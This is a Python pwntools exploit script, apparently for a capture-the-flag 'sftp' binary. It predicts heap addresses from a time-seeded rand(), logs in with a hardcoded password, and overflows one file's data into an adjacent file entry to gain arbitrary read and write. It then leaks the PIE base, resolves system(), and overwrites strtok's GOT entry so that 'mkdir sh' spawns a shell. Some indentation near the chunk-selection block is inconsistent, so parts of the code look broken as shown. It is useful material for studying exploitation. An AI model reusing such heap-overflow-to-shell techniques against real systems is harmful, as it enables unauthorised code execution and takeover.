from pwn import *
import ctypes

libc = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

r = process("./sftp")
#r = remote('sftp.ctfcompetition.com', 1337)

libc.srand(libc.time(0))

pause()
r.sendline("yes")
r.sendline("PYgreunionzY")

allocations_count = 0

def malloc(debug=False):
    global allocations_count
    allocations_count += 1
    addr = libc.rand() & 0x1FFFFFFF | 0x40000000
    if debug:
        log.info("malloc %d => %#x" % (allocations_count, addr))
    return addr

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#           EXPLOIT START
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# 6 allocations
# 1 -> root_entry: c01db33f
# 2 ->  |- flag file entry
# 3 ->  |   `- flag data
# 4 ->  `- src directory entry
# 5 ->      `- sftp.c file entry
# 6 ->          `- sftp.c data

root_entry = malloc()
log.info("root entry   => %#x" % root_entry)

# Pre-allocate the default entries as the binary does minus the
#  /home entry in the bss
fixed_allocs = 6
for i in xrange(1, fixed_allocs):
    malloc()

chunks = []
magic_chunk = None

# Every 100th allocation, take the chunks, sort them
# and find the two with the minimum difference
def find_min_diff():
	global chunks

	chunks.sort()

	min_diff = 0x60100000 - 0x40000000 + 1
	pos = None

	for i in range(len(chunks) - 1):
		diff = chunks[i + 1][0] - chunks[i][0]
		if diff < min_diff:
			min_diff = diff
			pos = i
	return (pos, min_diff)

file_max_size = 65535

while not magic_chunk:
	for i in range(100):
		addr = malloc()
		chunks.append((addr, allocations_count))

	pos, padlen = find_min_diff()
	if pos and padlen <= file_max_size - 0x30:
        # magic_chunk will be used to overflow through victim
	magic_chunk =  {
		'addr' : chunks[pos][0],
		'allocs_needed' : chunks[pos][1]
        }
        # victim file entry whose data pointer we will overwrite
        # in order to get r/w prims
	victim =  {
		'addr' : chunks[pos + 1][0],
		'allocs_needed' : chunks[pos + 1][1]
        }

	log.success("magic chunk  => %#x (%dth allocation)" % (magic_chunk['addr'], magic_chunk['allocs_needed']))
	log.success("victim chunk => %#x (%dth allocation)" % (victim['addr'], victim['allocs_needed']))
	log.info("diff is %d bytes" % padlen)
	break

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#           COMMANDS
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

def cmd(c):
    r.sendlineafter('> ', c)

def mkdir(name):
    cmd('mkdir ' + name)

def get(file_name):
    cmd('get ' + file_name)
    size = int(r.recvline())
    return r.recv(size)

entries = fixed_allocs

def put(file_name, size, data):
    global entries

    cmd('put ' + file_name)
    r.sendline(str(size))
    entries += 1
    if size > 0:
        # another allocation for data chunk
        entries += 1
        r.send(data)

prog = log.progress('Setting up file entries')

def make_file_entries(n):
    # Make file entries until |n| number of entries
    global entries

    for _ in range(entries, n):
        put('file_%d' % entries, 0, '')
        prog.status('%d entries' % entries)

# allocate enough files before the magic_chunk
make_file_entries(magic_chunk['allocs_needed'] - 2)
# allocate magic_chunk
put('magic', file_max_size, 'A' * file_max_size)
# allocate victim / file entry
make_file_entries(victim['allocs_needed'])

prog.success('done')

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#               R/W
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

FILE_ENTRY_TYPE = 0x2

def craft_file_entry(size, addr):
    data = 'A' * padlen
    file_entry =  p64(0xc01db33f)            # entry.parent_directory
    file_entry += p32(FILE_ENTRY_TYPE)       # entry.type
    file_entry += 'victim'.ljust(20, '\x00') # entry.name
    file_entry += p64(size)                  # size
    file_entry += p64(addr)                  # data

    payload = data + file_entry
    payload = payload.ljust(file_max_size, '\x00')

    put('magic', file_max_size, payload)

# leak() and write() overwrite a file_entry structure
# and craft a data pointer of our choice in order to
# read from and write to respectively
def leak(addr, size):
    craft_file_entry(size, addr)
    return get('victim')

def write(what, where):
    craft_file_entry(len(what), where)
    put('victim', len(what), what)

# The very first entry is stored in the bss while the
# and its childs on the heap
home_entry_addr = u64(leak(root_entry, 8))
pie_base = home_entry_addr - 0x208be0

log.success("PIE base address => %#x" % pie_base)

leak8 = lambda x: leak(x, 8)

with context.quiet:
    dynelf = DynELF(leak8, pie_base, elf=ELF('./sftp'))
    system = dynelf.lookup('system', 'libc')

log.success("system address => %#x" % system)

strtok_got = pie_base + 0x2050c0
write(p64(system), strtok_got)

# handle_mkdir('sh')
#   `- find_entry('sh')
#        `- strtok('sh', '/')

# strtok('sh', '/') => system('sh')
mkdir('sh')

r.interactive()
